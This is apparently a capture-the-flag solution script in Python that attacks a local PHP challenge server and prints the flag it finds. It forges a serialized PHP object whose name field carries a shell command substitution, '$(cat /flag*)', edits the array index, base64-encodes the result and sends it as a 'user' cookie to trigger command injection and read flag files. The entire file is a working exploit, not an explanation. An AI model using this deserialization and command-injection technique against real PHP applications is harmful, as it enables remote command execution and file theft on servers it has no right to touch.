#!/usr/bin/env python3
from subprocess import check_output
from urllib.parse import quote
from base64 import b64encode
import requests, re

url = 'http://localhost:10001'

php_code = '''
class User {
    private $name;
    function __construct($username) {
        $this->name = $username;
    }
};
echo serialize([
    new User('"$(id)"'),
    new User('owo'),
]);
'''.replace('id', 'cat /flag*')

payload = check_output(['php','-r',php_code])
payload = payload.replace(b'i:1;',b'i:0;')
print(payload)
payload = quote(b64encode(payload))
res = requests.get(url, headers={ 'Cookie': 'user='+payload })
# print(res.text)
flag = re.findall('SCIST{.+}', res.text)
print(flag)
